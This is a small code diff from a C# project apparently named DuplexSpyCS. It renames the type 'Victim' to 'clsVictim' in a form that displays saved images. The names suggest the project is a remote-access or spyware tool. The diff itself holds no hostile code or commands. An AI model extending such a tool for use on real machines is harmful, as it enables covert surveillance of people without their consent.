@@ -14,9 +14,9 @@ namespace DuplexSpyCS
     public partial class frmShowImgSave : Form
     {
         public int img_cnt;
-        private Victim v;
+        private clsVictim v;
 
-        public frmShowImgSave(Victim v)
+        public frmShowImgSave(clsVictim v)
         {
             InitializeComponent();
             
